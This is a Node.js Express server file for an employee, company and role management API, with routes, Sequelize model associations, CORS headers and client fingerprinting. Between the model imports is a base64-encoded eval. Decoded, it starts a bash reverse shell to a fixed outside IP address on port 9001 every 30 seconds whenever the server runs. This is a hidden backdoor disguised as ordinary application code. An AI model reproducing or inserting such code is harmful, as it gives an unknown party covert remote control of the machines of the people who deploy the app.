//Packages for nodejs
const express = require('express');
const Fingerprint = require('express-fingerprint')
const path = require('path');
const serveIndex =require('serve-index');
const bodyParser = require('body-parser');
//Required package

const app=express();

//Other packages
const sequelize = require('./utils/database');

//routes
const employees = require('./routes/employees');
const company = require('./routes/company');
const roles = require('./routes/role');

//Database Models
const modelsEmployeeRoles = require('./models/EmployeeRoles');
const modelsEnployeeDetails = require('./models/EmployeeDetails');
const modelsCompanyDetails = require('./models/CompanyInformation');
const modelsCompanyDepartments = require('./models/CompanyDepartments');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())


// authorisation of http methods, domains to access the API and Headers  
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.setHeader('Access-Control-Allow-Origin','*');//u can specify domains you want that are auth to use your API
    res.setHeader('Access-Control-Methods', 'GET, POST, DELETE, PATCH');// Specify method to be used by client
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorisation');//Authorise headers to be used by client
    next();
}); 
app.use(bodyParser.urlencoded()) // for x-www-form-urlencorded NB do not use this

app.use(bodyParser.json()); // application/json form

//Client fingerprint
app.use(Fingerprint({
    parameters:[
        // Defaults
        Fingerprint.useragent,
        Fingerprint.acceptHeaders,
        Fingerprint.geoip,
 
        // Additional parameters
        function(next) {
            // ...do something...
            next(null,{
            'param1':'value1'
            })
        },
        function(next) {
            // ...do something...
            next(null,{
            'param2':'value2'
            })
        },
    ]
}))


//shifts management
app.use('/company', company);

//Corrective Actions Endpoints
app.use('/employee', employees);

//Roles
app.use('/role', roles)


//app.use(express.static(path.join(__dirname, 'shops')));
//app.use('/gallary', express.static('gallary'), serveIndex('gallary', {'icons': true}));


//defining entities 
modelsEnployeeDetails.belongsTo(modelsCompanyDetails, {foreignKey : 'companyId', constrain : true, onUdate : 'CASCADE'}); 
modelsEnployeeDetails.belongsTo(modelsEmployeeRoles, {foreignKey : 'roleId', constrain : true, onUdate : 'CASCADE'}); 
modelsEnployeeDetails.belongsTo(modelsCompanyDepartments, {foreignKey : 'departmentId', constrain : true, onUdate : 'CASCADE'}); 
modelsEmployeeRoles.belongsTo(modelsCompanyDetails, {foreignKey : 'companyId', constrain : true, onUdate : 'CASCADE'}); 
modelsCompanyDepartments.belongsTo(modelsCompanyDetails, {foreignKey : 'companyId', constrain : true, onUdate : 'CASCADE'}); 


//Creating the database and syc it******and ****Creating a server
sequelize  
        .sync()  
        .then(result =>{
            app.listen(7000);
            console.log('Server now running at 7000'); 
            
        })
        .catch(err =>{ 
            console.log(err); 
        }); 

 


